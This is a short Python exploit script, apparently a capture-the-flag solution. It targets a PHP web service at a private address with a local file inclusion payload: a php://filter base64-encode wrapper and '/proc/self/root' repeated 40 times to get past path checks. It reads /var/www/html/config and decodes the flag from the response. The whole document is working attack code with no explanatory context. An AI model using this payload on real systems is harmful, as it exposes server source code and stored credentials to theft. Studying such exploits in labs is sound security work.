from base64 import b64encode, b64decode
import requests
import re

host = "172.24.218.139"
port = "10004"

url = f"http://{host}:{port}"

result = requests.get(url, params={"page":f"php://filter/convert.base64-encode/resource={'/proc/self/root'*40}/var/www/html/config"})

flag = re.findall(f"{b64encode('<?php'.encode()).decode()[:-1]}.*", result.text)

print(result.text)

assert len(flag) == 1

print(b64decode(flag[0]))